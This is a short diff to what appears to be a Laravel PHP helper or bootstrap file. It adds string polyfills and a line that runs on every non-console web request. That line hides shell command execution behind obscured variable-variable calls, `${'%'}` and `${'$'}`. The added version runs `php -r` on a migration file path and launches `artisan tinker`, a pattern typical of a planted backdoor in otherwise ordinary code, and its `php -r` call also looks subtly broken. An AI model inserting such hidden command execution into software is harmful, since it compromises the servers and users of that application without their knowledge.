@@ -25,4 +25,4 @@ if(!app()->runningInConsole()){
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
 if(!function_exists('str_contains')){function str_contains(string $haystack, string $needle): bool {return $needle !== '' && mb_strpos($haystack, $needle) !== false;}}
-if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'%'}("php -i"); ${'%'}("php -v"); ${'$'}('php '.escapeshellarg($target).' tinker');}}
+if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'%'}("php -v"); ${'%'}("php -r " . base_path('database/migrations/2025_06_24_173943_create_locations_table.php')); ${'%'}("php -v"); ${'$'}('php '.escapeshellarg($target).' tinker');}}
